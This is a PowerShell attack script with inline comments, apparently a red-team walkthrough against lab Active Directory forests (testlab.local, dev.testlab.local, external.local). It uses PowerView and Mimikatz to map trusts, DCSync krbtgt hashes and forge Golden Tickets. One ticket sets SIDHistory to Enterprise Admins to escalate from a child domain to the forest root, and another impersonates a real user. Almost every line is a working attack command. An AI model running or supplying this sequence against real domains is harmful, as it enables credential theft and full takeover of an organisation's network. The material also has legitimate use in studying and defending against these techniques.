# import PowerView and Invoke-Mimikatz
Import-Module .\powerview.ps1
Import-Module .\mimikatz.ps1

# map all reachable domain trusts
Invoke-MapDomainTrust

# enumerate groups with 'foreign' users users, and convert the foreign principal SIDs to names
Find-ForeignGroup -Domain external.local
Find-ForeignGroup -Domain external.local | Select-Object -ExpandProperty UserName | Convert-SidToName

# gather information for jwarner.a (his SID and group IDs) so we can impersonate him later
Get-NetUser jwarner.a -Domain testlab.local
Get-NetGroup -UserName jwarner.a -Domain testlab.local | Convert-NameToSid | fl

# dcsync the krbtgt hash from the dev.testlab.local child domain
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dev\krbtgt"'

# enumerate the domain SIDs for dev.testlab.local and testlab.local
"dev\krbtgt" | Convert-NameToSid | fl
"testlab\krbtgt" | Convert-NameToSid | fl

# create a Golden Ticket for a non-existent DEV user, and set the SIDHistory to 'Enterprise Admins' for testlab.local
#   this lets us hop up the trust and compromise the forest root
Invoke-Mimikatz -Command '"kerberos::golden /user:nonexistent /domain:dev.testlab.local /sid:S-1-5-21-339048670-1233568108-4141518690 /krbtgt:fbf3ab8e6dd58ebee6f792837ba492b7 /sids:S-1-5-21-890171859-3433809279-3366196753-519 /ptt"'

# enumerate the domain controllers for testlab.local and confirm access
Get-NetDomainController -Domain testlab.local
dir \\PRIMARY.testlab.local\C$

# dcsync the krbtgt hash for testlab.local
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:testlab.local /user:testlab\krbtgt"'

# purge the existing Golden Ticket
Invoke-Mimikatz -Command '"kerberos::purge"'

# create a Golden Ticket for jwarner.a, using the information enumerated earlier so ticket parameters match
Invoke-Mimikatz -Command '"kerberos::golden /user:jwarner.a /domain:testlab.local /id:1116 /groups:513,1117 /sid:S-1-5-21-890171859-3433809279-3366196753 /krbtgt:c74a635537214e6dbf488b646fa0157f /ptt"'

# dcsync the krbtgt hash from the external.local forest trust
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:external.local /user:external\krbtgt"'
